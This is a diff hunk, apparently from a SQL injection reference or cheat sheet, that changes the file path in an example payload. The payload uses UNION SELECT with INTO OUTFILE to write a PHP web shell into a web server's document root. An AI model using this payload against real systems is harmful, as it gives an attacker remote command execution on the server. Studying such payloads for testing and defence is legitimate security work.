@@ -108,6 +108,6 @@ Note: for this to work, the user running the database needs to have `write` perm
 
 Example payload (might produce an error due to the return type, won't affect the result):
 ```
-' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- -
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- -
 ```
 This will write `<?php system($_GET['cmd']);>` into `/var/www/html/tmp/webshell.php`. 
